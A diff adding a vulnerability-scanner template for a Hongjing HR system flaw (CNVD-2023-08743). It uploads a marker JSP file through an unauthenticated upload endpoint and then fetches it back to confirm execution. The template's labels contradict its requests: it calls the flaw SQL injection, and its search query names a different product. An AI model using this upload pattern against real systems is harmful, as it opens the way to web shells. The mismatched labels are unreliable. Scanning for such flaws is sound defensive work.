@@ -1,0 +1,40 @@
+id: CNVD-2023-08743
+
+info:
+  name: Hongjing Human Resource Management System - SQL Injection
+  author: SleepingBag945
+  severity: critical
+  description: There is a SQL injection vulnerability in the categories of Hongjing Human Resource Management System, from which attackers can obtain sensitive database information.
+  reference:
+    - https://www.henry4e36.top/index.php/archives/162.html
+    - https://blog.csdn.net/qq_41904294/article/details/130944159
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="用友-U8-Cloud"
+  tags: cnvd,cnvd2023,hongjing,hcm
+
+http:
+  - raw:
+      - |
+        POST /linux/pages/upload.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Connection: close
+        Content-Length: 31
+        Content-Type: application/x-www-form-urlencoded
+        filename: MichaelJordan.jsp
+        Accept-Encoding: gzip
+
+        <% out.println("20231101");%>
+
+      - |
+        GET /linux/MichaelJordan.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+
+    matchers:
+      - type: word
+        words:
+          - "20231101"
